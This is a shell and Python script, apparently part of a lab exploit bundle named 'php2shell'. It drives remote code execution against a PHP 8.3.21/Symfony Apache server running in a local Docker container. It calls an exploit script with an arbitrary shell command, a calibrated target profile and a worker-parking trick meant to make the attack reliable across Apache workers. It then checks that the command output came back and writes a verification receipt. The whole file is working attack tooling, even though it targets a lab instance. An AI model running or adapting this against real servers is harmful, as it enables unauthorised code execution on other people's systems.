#!/bin/sh
set -eu

bundle_dir=$(CDPATH= cd -- "$(dirname "$0")/.." && pwd)
target=php2shell-symfony-8321-lab
port=${PHP2SHELL_SYMFONY_8321_PORT:-9094}
command=${*:-id}

workers=$(
    docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' "$target" |
        awk -F= '$1 == "PHP2SHELL_APACHE_WORKERS" { value = $2 } END { print value }'
)
case "$workers" in
    *[!0-9]*|'') echo "Invalid worker count in target: $workers" >&2; exit 2 ;;
esac
if [ "$workers" -lt 2 ] || [ "$workers" -gt 16 ]; then
    echo "The multiworker PoC requires 2..16 workers; target has $workers" >&2
    exit 2
fi

"$bundle_dir/scripts/verify.sh"

stamp=$(date -u +%Y%m%dT%H%M%SZ)
output_dir="$bundle_dir/artifacts/multiworker-${workers}-${stamp}-$$"
mkdir "$output_dir"

python3 -B "$bundle_dir/calibration/agent_psfiles/exploit_generic.py" \
    --url "http://127.0.0.1:${port}/index.php" \
    --host-header 127.0.0.1:8088 \
    --cmd "$command" \
    --profile-json "$bundle_dir/calibration/agent_psfiles/profile-calibrated-php-8.3.21-symfony.json" \
    --memory-limit 8 \
    --workers "$workers" \
    --output-dir "$output_dir" \
    -vv

python3 -B - "$output_dir" "$workers" "$command" <<'PY'
from __future__ import annotations

import hashlib
import json
from pathlib import Path
import sys


output_dir = Path(sys.argv[1])
workers = int(sys.argv[2])
command = sys.argv[3]
result = json.loads((output_dir / "result.json").read_text(encoding="utf-8"))
parking = json.loads(
    (output_dir / "worker-parking.json").read_text(encoding="utf-8")
)
command_output = (output_dir / "command-output.bin").read_bytes()
errors: list[str] = []

expected_result = {
    "status": "RCE_OUTPUT_OBSERVED",
    "terminal_http_status": 200,
    "http_body_complete": True,
    "command": command,
    "apache_worker_count": workers,
    "parked_worker_count": workers - 1,
    "worker_affinity": "prefork-keepalive-fencing",
}
for key, expected in expected_result.items():
    if result.get(key) != expected:
        errors.append(f"result.{key}={result.get(key)!r}, expected {expected!r}")

digest = hashlib.sha256(command_output).hexdigest()
if not command_output:
    errors.append("command output is empty")
if result.get("command_output_bytes") != len(command_output):
    errors.append("command output length does not match result.json")
if result.get("command_output_sha256") != digest:
    errors.append("command output SHA-256 does not match result.json")

expected_parking = {
    "protocol": "php2shell-prefork-keepalive-fencing/v1",
    "configured_worker_count": workers,
    "target_parked_worker_count": workers - 1,
    "opened_parking_connection_count": workers - 1,
    "active_parking_connections": 0,
    "affinity": "prefork-keepalive-fencing",
    "closed": True,
}
for key, expected in expected_parking.items():
    if parking.get(key) != expected:
        errors.append(f"parking.{key}={parking.get(key)!r}, expected {expected!r}")

events = parking.get("events")
if not isinstance(events, list):
    errors.append("parking event transcript is missing")
elif any(
    isinstance(event, dict) and event.get("event") == "heartbeat-failed"
    for event in events
):
    errors.append("a parked worker heartbeat failed")

receipt = {
    "protocol": "php2shell-symfony-8321-multiworker/v1",
    "verified": not errors,
    "worker_count": workers,
    "parked_worker_count": workers - 1,
    "command": command,
    "command_output_bytes": len(command_output),
    "command_output_sha256": digest,
    "errors": errors,
}
(output_dir / "multiworker-verification.json").write_text(
    json.dumps(receipt, indent=2) + "\n", encoding="utf-8"
)
if errors:
    raise SystemExit("\n".join(f"MULTIWORKER_VERIFY_ERROR: {e}" for e in errors))
PY

"$bundle_dir/scripts/verify.sh"

printf 'MULTIWORKER_RCE_OK\n'
printf 'workers=%s\n' "$workers"
printf 'parked=%s\n' "$((workers - 1))"
printf 'receipt=%s\n' "$output_dir"
